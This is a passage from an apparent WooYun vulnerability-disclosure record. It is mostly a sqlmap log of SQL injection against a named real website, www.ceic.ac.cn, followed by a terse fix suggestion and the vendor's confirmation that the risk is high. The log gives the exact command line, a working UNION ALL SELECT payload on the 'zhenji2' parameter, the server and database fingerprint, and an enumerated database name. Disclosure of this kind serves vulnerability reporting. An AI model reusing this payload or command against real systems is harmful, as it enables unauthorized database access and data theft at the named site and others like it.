confirming MySQL[17:41:41] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.3.29back-end DBMS: MySQL >= 5.0.0[17:41:41] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\www.ceic.ac.cn'[*] shutting down at 17:41:41C:\\Python27\\sqlmap>sqlmap.py -u \"http://www.ceic.ac.cn/history?start=%E2%80%98&end=&weidu1=&weidu2=&jingdu1=&jingdu2=&height1=&height2=&zhenji1=&zhenji2=&sub=%E6%9F%A5%E8%AF%A2\" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20141101}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 17:42:15[17:42:15] [WARNING] provided value for parameter 'end' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'weidu1' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'weidu2' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'jingdu1' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'jingdu2' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'height1' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'height2' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'zhenji1' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'zhenji2' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [INFO] resuming back-end DBMS 'mysql'[17:42:15] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: zhenji2    Type: UNION query    Title: MySQL UNION query (NULL) - 24 columns    Payload: start=%E2%80%98&end=&weidu1=&weidu2=&jingdu1=&jingdu2=&height1=&height2=&zhenji1=&zhenji2=' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7177706371,0x6445504d5a614a565475,0x7165796871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&sub=%E6%9F%A5%E8%AF%A2---[17:42:16] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.3.29back-end DBMS: MySQL 5[17:42:16] [INFO] fetching database names[17:42:31] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique[17:42:46] [WARNING] the SQL query provided does not return any output[17:42:46] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[17:42:46] [INFO] falling back to current database[17:42:46] [INFO] fetching current database[17:42:46] [WARNING] reflective value(s) found and filtering outavailable databases [1]:[*] app_dizhentai[17:42:46] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\www.ceic.ac.cn'[*] shutting down at 17:42:46\n\n\n\n\n   修复方案：  过滤吧   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-11-28 14:26 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}